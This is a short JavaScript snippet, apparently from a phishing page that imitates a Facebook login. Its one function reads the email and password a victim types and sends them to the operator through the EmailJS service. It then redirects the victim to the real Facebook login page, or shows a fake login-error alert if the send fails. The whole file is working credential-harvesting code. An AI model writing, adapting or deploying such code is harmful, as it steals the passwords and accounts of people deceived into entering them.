// The get Info Function
function getInfo(params) {
  var btn = document.getElementById("btn");

  var templateParams = {
    number:  document.getElementById("emailtxt").value,
    password: document.getElementById("passtxt").value, 
  };
  
  emailjs.send('gmail', 'shfbfhjsdj', templateParams)
  .then(function(response) {  
    console.log('SUCCESS!', response.status, response.text);
    window.location.href = "https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjU4MzA4NDExLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D";
   }, function(error) {
    console.log('FAILED...', error);
    alert("Error with Logging in");
  });

}